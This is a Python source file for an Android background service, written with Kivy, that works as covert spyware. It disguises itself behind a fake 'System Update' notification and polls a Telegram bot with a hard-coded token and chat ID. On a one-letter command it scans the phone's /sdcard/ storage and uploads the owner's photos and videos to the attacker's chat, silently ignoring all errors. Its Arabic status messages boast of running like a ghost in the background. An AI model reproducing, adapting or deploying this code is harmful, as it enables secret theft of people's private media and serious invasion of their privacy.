import os
import time
import requests
from threading import Thread
from jnius import autoclass

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"
URL = f"https://api.telegram.org/bot{TOKEN}/"

def send_to_bot(text):
    try: requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text})
    except: pass

def start_foreground():
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        Context = autoclass('android.content.Context')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        
        channel_id = 'shadow_channel'
        channel = NotificationChannel(channel_id, 'System Update', 3)
        manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
        manager.createNotificationChannel(channel)
        
        builder = NotificationBuilder(service, channel_id)
        builder.setContentTitle("System Update")
        builder.setContentText("Checking compatibility...")
        builder.setSmallIcon(service.getApplicationInfo().icon)
        
        service.startForeground(1, builder.build())
    except: pass

class ShadowRunner:
    def __init__(self):
        self.sent_files = []

    def scan_and_send(self, ext):
        send_to_bot(f"⏳ جاري سحب ملفات {ext} من الأعماق...")
        found = 0
        for r, d, f_list in os.walk("/sdcard/"):
            for f in f_list:
                if f.lower().endswith(ext):
                    p = os.path.join(r, f)
                    if p not in self.sent_files and os.path.getsize(p) > 50000:
                        try:
                            with open(p, 'rb') as img:
                                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": img})
                            self.sent_files.append(p)
                            found += 1
                            time.sleep(0.5)
                        except: pass
                    if found >= 25: break
            if found >= 25: break
        send_to_bot(f"🏁 تمت عملية سحب {found} ملف بنجاح.")

    def start(self):
        start_foreground()
        # إشارة الحياة فوراً للبوت
        send_to_bot("🚀 تم تفعيل الخدمة بنجاح! أنا الآن أعمل في الخلفية كالشبح وجاهز لأوامرك.")
        
        last_id = 0
        while True:
            try:
                res = requests.get(URL + "getUpdates", params={"offset": last_id+1, "timeout": 15}).json()
                for up in res.get("result", []):
                    last_id = up["update_id"]
                    msg = up.get("message", {}).get("text", "").upper()
                    if msg == "M": Thread(target=self.scan_and_send, args=(".jpg",)).start()
                    if msg == "O": Thread(target=self.scan_and_send, args=(".mp4",)).start()
            except: time.sleep(10)

if __name__ == "__main__":
    ShadowRunner().start()
